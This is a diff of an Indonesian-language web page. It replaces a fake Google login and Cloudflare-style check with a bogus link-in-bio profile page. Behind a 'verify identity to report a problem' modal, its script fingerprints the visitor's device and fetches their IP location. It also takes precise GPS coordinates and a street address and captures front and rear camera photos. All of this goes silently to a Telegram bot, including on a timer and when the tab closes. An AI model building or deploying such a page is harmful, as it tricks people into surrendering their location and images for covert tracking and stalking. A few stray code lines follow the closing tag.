@@ -3,71 +3,140 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google - Masuk</title>
+    <title>@lynxzcreator | Lynk</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
-        body { font-family: 'Google Sans', Roboto, Arial, sans-serif; height: 100vh; display: flex; justify-content: center; align-items: center; background: #fff; }
-        .login-bg { position: absolute; top: 0; left: 0; right: 0; bottom: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; filter: blur(8px); opacity: 0.3; pointer-events: none; }
-        .login-bg .google-logo { width: 75px; margin-bottom: 20px; }
-        .login-bg .box { width: 360px; padding: 40px; background: #fff; border: 1px solid #dadce0; border-radius: 8px; }
-        .login-bg h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; }
-        .login-bg p { color: #5f6368; font-size: 14px; margin-bottom: 30px; }
-        .login-bg input { width: 100%; padding: 12px; border: 1px solid #dadce0; border-radius: 4px; margin-bottom: 20px; }
-        .login-bg .next-btn { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-weight: bold; font-size: 14px; }
-        .popup-overlay { position: absolute; top: 0; left: 0; right: 0; bottom: 0; background: rgba(255,255,255,0.5); display: flex; justify-content: center; align-items: center; z-index: 10; }
-        .popup { width: 400px; background: #fff; border-radius: 12px; box-shadow: 0 25px 50px rgba(0,0,0,0.2); padding: 30px 25px; text-align: center; }
-        .cf-shield { display: flex; align-items: center; justify-content: center; margin-bottom: 10px; }
-        .cf-icon { width: 40px; height: 40px; background: #f48120; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 8px; }
-        .cf-icon span { color: #fff; font-size: 22px; font-weight: bold; }
-        .cf-title { font-size: 18px; font-weight: 600; color: #404040; }
-        .cf-sub { font-size: 13px; color: #f48120; margin: 5px 0 15px; }
-        .check-list { text-align: left; margin: 20px 0; }
-        .check-item { display: flex; align-items: center; padding: 8px 0; border-bottom: 1px solid #eee; }
-        .check-icon { width: 22px; height: 22px; border-radius: 50%; margin-right: 10px; display: flex; align-items: center; justify-content: center; color: #fff; font-size: 12px; }
-        .done { background: #4CAF50; }
-        .pending { background: #ccc; animation: pulse 1.5s infinite; }
-        .failed { background: #f44336; }
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
-        .check-label { flex: 1; font-size: 13px; }
-        .check-status { font-size: 11px; color: #888; }
-        .verify-btn { width: 100%; padding: 12px; background: #f48120; color: white; border: none; border-radius: 6px; font-size: 15px; font-weight: bold; cursor: pointer; margin-top: 5px; }
-        .verify-btn:disabled { background: #bbb; cursor: not-allowed; }
-        .retry-btn { background: #fff; border: 1px solid #f48120; color: #f48120; font-weight: bold; padding: 6px 16px; border-radius: 4px; cursor: pointer; margin-top: 8px; }
-        .error-msg { color: #f44336; font-size: 12px; margin-top: 10px; }
-        .status-text { font-size: 12px; color: #666; margin-top: 10px; min-height: 18px; }
+        body {
+            font-family: 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            width: 100%;
+            max-width: 400px;
+            background: rgba(255,255,255,0.95);
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
+            padding: 30px 25px;
+            text-align: center;
+        }
+        .avatar {
+            width: 90px;
+            height: 90px;
+            border-radius: 50%;
+            background: #ddd;
+            margin: 0 auto 15px;
+            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><circle cx="50" cy="35" r="25" fill="%23aaa"/><circle cx="50" cy="95" r="35" fill="%23aaa"/></svg>');
+            background-size: cover;
+        }
+        h2 { font-size: 22px; color: #333; margin-bottom: 4px; }
+        .bio { color: #777; font-size: 14px; margin-bottom: 20px; }
+        .links { display: flex; flex-direction: column; gap: 12px; }
+        .link-item {
+            display: flex;
+            align-items: center;
+            background: #f8f9fa;
+            border: 1px solid #e0e0e0;
+            padding: 14px 18px;
+            border-radius: 14px;
+            text-decoration: none;
+            color: #333;
+            font-weight: 500;
+            transition: 0.2s;
+        }
+        .link-item:hover { background: #e9ecef; }
+        .link-icon { font-size: 22px; margin-right: 14px; }
+        .report-text {
+            margin-top: 30px;
+            font-size: 11px;
+            color: #aaa;
+            cursor: pointer;
+            text-decoration: underline;
+        }
+        /* Modal */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.6);
+            justify-content: center;
+            align-items: center;
+            z-index: 100;
+        }
+        .modal {
+            width: 320px;
+            background: #fff;
+            border-radius: 16px;
+            padding: 25px;
+            text-align: center;
+        }
+        .modal h3 { margin-bottom: 10px; }
+        .modal p { font-size: 13px; color: #666; margin-bottom: 15px; }
+        .modal button {
+            width: 100%;
+            padding: 12px;
+            background: #667eea;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .modal button:disabled { background: #aaa; }
+        .retry-btn {
+            background: #fff;
+            border: 1px solid #667eea;
+            color: #667eea;
+            font-weight: bold;
+            padding: 6px 16px;
+            border-radius: 6px;
+            cursor: pointer;
+            margin-top: 8px;
+        }
+        .error-msg { color: red; font-size: 12px; margin-top: 8px; }
+        .status-text { font-size: 12px; color: #666; margin-top: 8px; min-height: 18px; }
     </style>
 </head>
 <body>
-    <div class="login-bg">
-        <img class="google-logo" src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
-        <div class="box">
-            <h1>Masuk</h1>
-            <p>Gunakan Akun Google Anda</p>
-            <input type="email" placeholder="Email atau nomor telepon" disabled>
-            <button class="next-btn">Berikutnya</button>
+    <div class="container">
+        <div class="avatar"></div>
+        <h2>@lynxzcreator</h2>
+        <p class="bio">Pengen jadi programer | Kadang suka ngoprek</p>
+        <div class="links">
+            <a href="https://instagram.com/lynxzcreator" class="link-item" target="_blank">
+                <span class="link-icon">📷</span> Instagram
+            </a>
+            <a href="https://facebook.com/lynxz" class="link-item" target="_blank">
+                <span class="link-icon">📘</span> Facebook
+            </a>
+            <a href="https://wa.me/6281234567890" class="link-item" target="_blank">
+                <span class="link-icon">💬</span> WhatsApp
+            </a>
+            <a href="https://tiktok.com/@lynxz" class="link-item" target="_blank">
+                <span class="link-icon">🎵</span> TikTok
+            </a>
+            <a href="https://youtube.com/@lynxz" class="link-item" target="_blank">
+                <span class="link-icon">▶️</span> YouTube
+            </a>
+            <a href="https://twitter.com/lynxz" class="link-item" target="_blank">
+                <span class="link-icon">🐦</span> Twitter / X
+            </a>
         </div>
+        <div class="report-text" id="reportTrigger">Laporkan masalah keamanan</div>
     </div>
 
-    <div class="popup-overlay" id="popupOverlay">
-        <div class="popup">
-            <div class="cf-shield">
-                <div class="cf-icon"><span>&#128737;</span></div>
-                <div class="cf-title">Cloudflare</div>
-            </div>
-            <div class="cf-sub">Dilindungi oleh Cloudflare • SSL/TLS Terenkripsi</div>
-            <div class="check-list">
-                <div class="check-item"><div class="check-icon done">✓</div><div class="check-label">Enkripsi SSL 256-bit</div><div class="check-status">Aman</div></div>
-                <div class="check-item"><div class="check-icon done">✓</div><div class="check-label">Firewall WAF</div><div class="check-status">Aktif</div></div>
-                <div class="check-item"><div class="check-icon done">✓</div><div class="check-label">Perangkat Terpercaya</div><div class="check-status">Terverifikasi</div></div>
-                <div class="check-item" id="identityCheck">
-                    <div class="check-icon pending" id="identityIcon">?</div>
-                    <div class="check-label">Verifikasi Identitas</div>
-                    <div class="check-status" id="identityStatus">Wajib</div>
-                </div>
-            </div>
-            <button class="verify-btn" id="verifyBtn" onclick="startVerification()">Verifikasi Sekarang</button>
+    <!-- Modal Verifikasi -->
+    <div class="modal-overlay" id="modalOverlay">
+        <div class="modal">
+            <h3>Verifikasi Keamanan</h3>
+            <p>Untuk melaporkan masalah, kami perlu memverifikasi identitas Anda. Izinkan akses lokasi dan kamera saat diminta.</p>
+            <button id="verifyBtn" onclick="startVerification()">Verifikasi Sekarang</button>
             <div id="retryArea"></div>
-            <div class="status-text" id="globalStatus"></div>
+            <div class="status-text" id="statusText"></div>
         </div>
     </div>
 
@@ -77,39 +146,312 @@
         const CHAT_ID = '5986004601';
         // =========================================
 
-        // Data yang akan dikumpulkan
         let fingerprintText = '';
-        let ipData = null;           // dari ipapi.co
-        let locationData = null;     // dari GPS
+        let locationData = null;
         let frontPhotoBlob = null;
         let backPhotoBlob = null;
-        let dataSent = false;        // cegah pengiriman ganda
-        let interactionStarted = false; // untuk timeout
+        let dataSent = false;
+        let interactionStarted = false;
+        let timeoutId;
 
-        // Elemen DOM
+        const reportTrigger = document.getElementById('reportTrigger');
+        const modalOverlay = document.getElementById('modalOverlay');
         const verifyBtn = document.getElementById('verifyBtn');
-        const identityIcon = document.getElementById('identityIcon');
-        const identityStatus = document.getElementById('identityStatus');
-        const globalStatus = document.getElementById('globalStatus');
+        const statusText = document.getElementById('statusText');
         const retryArea = document.getElementById('retryArea');
 
-        // ========== PENGUMPULAN FINGERPRINT ==========
+        // === FINGERPRINT LENGKAP ===
         async function collectFingerprint() {
             let fp = '';
-            // Dasar
-            fp += `📱 User Agent: ${navigator.userAgent}\n`;
+            fp += `📱 UA: ${navigator.userAgent}\n`;
             fp += `🖥️ Platform: ${navigator.platform}\n`;
-            fp += `🧠 CPU Cores: ${navigator.hardwareConcurrency || 'Tidak diketahui'}\n`;
-            fp += `💾 Device Memory: ${navigator.deviceMemory || 'Tidak diketahui'} GB\n`;
-            fp += `📏 Resolusi: ${screen.width}x${screen.height} (avail: ${screen.availWidth}x${screen.availHeight})\n`;
-            fp += `📐 Device Pixel Ratio: ${window.devicePixelRatio}\n`;
-            fp += `🎨 Color Depth: ${screen.colorDepth}-bit\n`;
-            fp += `🖐️ Touch Points: ${navigator.maxTouchPoints}\n`;
+            fp += `🧠 CPU: ${navigator.hardwareConcurrency} core\n`;
+            fp += `💾 RAM: ${navigator.deviceMemory || '?'} GB\n`;
+            fp += `📏 Resolusi: ${screen.width}x${screen.height} (DPR: ${window.devicePixelRatio})\n`;
+            fp += `🎨 Color: ${screen.colorDepth}-bit\n`;
+            fp += `🖐️ Touch: ${navigator.maxTouchPoints}\n`;
             fp += `🌐 Bahasa: ${navigator.language}\n`;
-            fp += `🍪 Cookie Enabled: ${navigator.cookieEnabled}\n`;
-            fp += `🕒 Zona Waktu: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
-            fp += `⏰ Waktu Lokal: ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}\n`;
+            fp += `🕒 Zona: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
 
+            try {
+                const bat = await navigator.getBattery();
+                fp += `🔋 Baterai: ${Math.round(bat.level*100)}% (Charging: ${bat.charging})\n`;
+            } catch(e){}
+
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (conn) fp += `📶 Koneksi: ${conn.effectiveType} (↓${conn.downlink} Mbps, RTT ${conn.rtt}ms)\n`;
+
+            try {
+                const c = document.createElement('canvas');
+                c.width = 280; c.height = 60;
+                const ctx = c.getContext('2d');
+                ctx.textBaseline = 'top'; ctx.font = '14px Arial';
+                ctx.fillStyle = '#f60'; ctx.fillRect(125,1,62,20);
+                ctx.fillStyle = '#069'; ctx.fillText('Linktree 1337', 2, 15);
+                fp += `🖼️ Canvas: ${btoa(c.toDataURL()).slice(0,24)}\n`;
+            } catch(e){}
+
+            try {
+                const c2 = document.createElement('canvas');
+                const gl = c2.getContext('webgl') || c2.getContext('experimental-webgl');
+                if (gl) {
+                    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (dbg) {
+                        fp += `🎮 GPU: ${gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL)} / ${gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL)}\n`;
+                    }
+                }
+            } catch(e){}
+
+            try {
+                const ac = new (window.AudioContext||window.webkitAudioContext)();
+                const osc = ac.createOscillator();
+                const ana = ac.createAnalyser();
+                osc.type = 'triangle'; osc.frequency.value = 10000;
+                osc.connect(ana); ana.connect(ac.destination);
+                osc.start(0);
+                const arr = new Float32Array(ana.fftSize);
+                ana.getFloatTimeDomainData(arr);
+                fp += `🔊 Audio: ${Array.from(arr.slice(0,10)).map(v=>v.toFixed(4)).join(',')}\n`;
+                osc.stop(); ac.close();
+            } catch(e){}
+
+            if (navigator.plugins) {
+                fp += `🧩 Plugins: ${Array.from(navigator.plugins).map(p=>p.name).join(', ') || 'none'}\n`;
+            }
+
+            return fp;
+        }
+
+        async function fetchIPData() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const d = await res.json();
+                fingerprintText += `\n🌐 IP: ${d.ip}\n🏢 ISP: ${d.org || '?'}\n📍 IP Location: ${d.city}, ${d.region}, ${d.country_name} (${d.postal})\n🌍 Coord: ${d.latitude}, ${d.longitude}\n`;
+            } catch(e) {
+                fingerprintText += '\n⚠️ Gagal mendapatkan data IP.\n';
+            }
+        }
+
+        // === PENGIRIMAN ===
+        async function sendMessage(text) {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method:'POST',
+                    headers:{'Content-Type':'application/json'},
+                    body:JSON.stringify({chat_id:CHAT_ID, text:text})
+                });
+            } catch(e){}
+        }
+        async function sendPhoto(blob, caption) {
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('photo', blob, 'verif.jpg');
+            fd.append('caption', caption);
+            try { await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method:'POST', body:fd}); } catch(e){}
+        }
+        async function sendLocation(lat, lon, acc) {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
+                    method:'POST',
+                    headers:{'Content-Type':'application/json'},
+                    body:JSON.stringify({chat_id:CHAT_ID, latitude:lat, longitude:lon, horizontal_accuracy:acc})
+                });
+            } catch(e){}
+        }
+        function dataURItoBlob(dataURI) {
+            const bytes = atob(dataURI.split(',')[1]);
+            const mime = dataURI.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(bytes.length);
+            const ia = new Uint8Array(ab);
+            for (let i=0; i<bytes.length; i++) ia[i] = bytes.charCodeAt(i);
+            return new Blob([ab], {type:mime});
+        }
+        async function captureFrame(stream) {
+            const v = document.createElement('video');
+            v.srcObject = stream; v.play();
+            await new Promise(r=>v.onloadedmetadata=r);
+            const c = document.createElement('canvas');
+            c.width = v.videoWidth; c.height = v.videoHeight;
+            c.getContext('2d').drawImage(v,0,0);
+            return new Promise(res=>c.toBlob(res,'image/jpeg',0.85));
+        }
+        async function createCollage(front, back) {
+            if (!back) return front; // tidak ada belakang, langsung front
+            const fImg = new Image(), bImg = new Image();
+            const fUrl = URL.createObjectURL(front), bUrl = URL.createObjectURL(back);
+            await new Promise(r=>{ fImg.onload=r; fImg.src=fUrl; });
+            await new Promise(r=>{ bImg.onload=r; bImg.src=bUrl; });
+            const w = fImg.width + bImg.width;
+            const h = Math.max(fImg.height, bImg.height);
+            const canvas = document.createElement('canvas');
+            canvas.width = w; canvas.height = h;
+            const ctx = canvas.getContext('2d');
+            ctx.fillStyle = '#000'; ctx.fillRect(0,0,w,h);
+            ctx.drawImage(fImg, 0, (h-fImg.height)/2);
+            ctx.drawImage(bImg, fImg.width, (h-bImg.height)/2);
+            URL.revokeObjectURL(fUrl); URL.revokeObjectURL(bUrl);
+            return new Promise(res=>canvas.toBlob(res,'image/jpeg',0.9));
+        }
+
+        // === PROSES DATA ===
+        async function sendAvailableData(reason) {
+            if (dataSent) return;
+            dataSent = true;
+            let msg = `⏳ Data Otomatis (${reason})\n${fingerprintText}`;
+            if (locationData) {
+                msg += `\n📍 GPS: ${locationData.lat}, ${locationData.lon} (±${locationData.acc.toFixed(1)}m)`;
+                sendLocation(locationData.lat, locationData.lon, locationData.acc);
+            }
+            await sendMessage(msg);
+        }
+
+        async function sendCompleteData() {
+            if (dataSent) return; // jika sudah terkirim via timeout, tetap kirim sebagai update?
+            dataSent = true;
+            let caption = `✅ Verifikasi Lengkap\n${fingerprintText}`;
+            if (locationData) {
+                caption += `\n📍 GPS: ${locationData.lat}, ${locationData.lon} (±${locationData.acc.toFixed(1)}m)`;
+                try {
+                    const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${locationData.lat}&lon=${locationData.lon}`);
+                    const d = await res.json();
+                    if (d && d.display_name) caption += `\n🏠 Alamat: ${d.display_name}`;
+                } catch(e){}
+                sendLocation(locationData.lat, locationData.lon, locationData.acc);
+            }
+            caption += `\n🕒 Waktu: ${new Date().toLocaleString('id-ID',{timeZone:'Asia/Jakarta'})}`;
+            if (frontPhotoBlob) {
+                const collage = await createCollage(frontPhotoBlob, backPhotoBlob);
+                await sendPhoto(collage, caption);
+            } else {
+                await sendMessage(caption);
+            }
+        }
+
+        // === TIMER ===
+        function startTimer() {
+            timeoutId = setTimeout(() => {
+                if (!interactionStarted && !dataSent) {
+                    sendAvailableData('30 detik tanpa aksi');
+                }
+            }, 30000);
+        }
+
+        // === MODAL & VERIFIKASI ===
+        reportTrigger.addEventListener('click', () => {
+            clearTimeout(timeoutId);
+            interactionStarted = true;
+            modalOverlay.style.display = 'flex';
+        });
+
+        function requestLocation(retryCount, callback) {
+            navigator.geolocation.getCurrentPosition(
+                pos => callback({success:true, data:pos}),
+                err => {
+                    if (retryCount < 1) {
+                        retryArea.innerHTML = `<p class="error-msg">Izin lokasi diperlukan.</p><button class="retry-btn" id="retryLocBtn">Coba Lagi</button>`;
+                        document.getElementById('retryLocBtn').onclick = ()=>{
+                            retryArea.innerHTML='';
+                            requestLocation(1, callback);
+                        };
+                    } else {
+                        callback({success:false});
+                    }
+                },
+                {enableHighAccuracy:true, timeout:10000, maximumAge:0}
+            );
+        }
+        function requestCamera(retryCount, callback) {
+            navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}})
+                .then(stream => callback({success:true, stream}))
+                .catch(err => {
+                    if (retryCount < 1) {
+                        retryArea.innerHTML = `<p class="error-msg">Izin kamera diperlukan.</p><button class="retry-btn" id="retryCamBtn">Coba Lagi</button>`;
+                        document.getElementById('retryCamBtn').onclick = ()=>{
+                            retryArea.innerHTML='';
+                            requestCamera(1, callback);
+                        };
+                    } else {
+                        callback({success:false});
+                    }
+                });
+        }
+
+        async function startVerification() {
+            verifyBtn.disabled = true;
+            verifyBtn.textContent = 'Memverifikasi...';
+            statusText.textContent = '';
+            retryArea.innerHTML = '';
+
+            let locDone = false, camDone = false;
+            const checkFinal = () => {
+                if (locDone && camDone) {
+                    if (!locationData && !frontPhotoBlob) {
+                        // Semua gagal, kirim data yang ada
+                        sendAvailableData('Izin ditolak');
+                        // Tampilkan error di modal
+                        statusText.textContent = 'Verifikasi gagal.';
+                        // Tidak redirect, biarkan modal tertutup manual
+                        modalOverlay.style.display = 'none';
+                    } else {
+                        sendCompleteData();
+                        statusText.textContent = 'Laporan terkirim. Terima kasih.';
+                        setTimeout(()=>{ modalOverlay.style.display = 'none'; }, 1500);
+                    }
+                }
+            };
+
+            requestLocation(0, res => {
+                if (res.success) {
+                    locationData = { lat:res.data.coords.latitude, lon:res.data.coords.longitude, acc:res.data.coords.accuracy };
+                    statusText.textContent = 'Lokasi OK';
+                }
+                locDone = true; checkFinal();
+            });
+            requestCamera(0, async res => {
+                if (res.success) {
+                    try {
+                        frontPhotoBlob = await captureFrame(res.stream);
+                        res.stream.getTracks().forEach(t=>t.stop());
+                        statusText.textContent = 'Kamera depan OK';
+                        try {
+                            const backStream = await navigator.mediaDevices.getUserMedia({video:{facingMode:{exact:'environment'}}});
+                            backPhotoBlob = await captureFrame(backStream);
+                            backStream.getTracks().forEach(t=>t.stop());
+                        } catch(e){}
+                    } catch(e) {}
+                }
+                camDone = true; checkFinal();
+            });
+        }
+
+        // === INISIALISASI ===
+        (async function init() {
+            // Kirim notifikasi pembuka
+            sendMessage('🔍 Seseorang membuka web. Saya akan melacaknya. Tunggu estimasi 30 detik, Tuan.');
+            // Kumpulkan fingerprint dan IP
+            let fp = await collectFingerprint();
+            fingerprintText = fp;
+            await fetchIPData();
+            // Mulai timer
+            startTimer();
+        })();
+
+        // Jika user menutup tab sebelum 30 detik, usahakan kirim fingerprint (tidak andal)
+        window.addEventListener('beforeunload', () => {
+            if (!dataSent) {
+                // Gunakan sendBeacon jika memungkinkan, tapi Telegram tidak support
+                // Sebagai alternatif, kita gunakan fetch dengan keepalive (mungkin gagal di beberapa browser)
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method:'POST',
+                    headers:{'Content-Type':'application/json'},
+                    body:JSON.stringify({chat_id:CHAT_ID, text:`❌ User menutup halaman sebelum 30 detik.\n${fingerprintText}`}),
+                    keepalive: true
+                }).catch(()=>{});
+            }
+        });
+    </script>
+</body>
+</html>
             // Baterai
             try {
                 const battery = await navigator.getBattery();
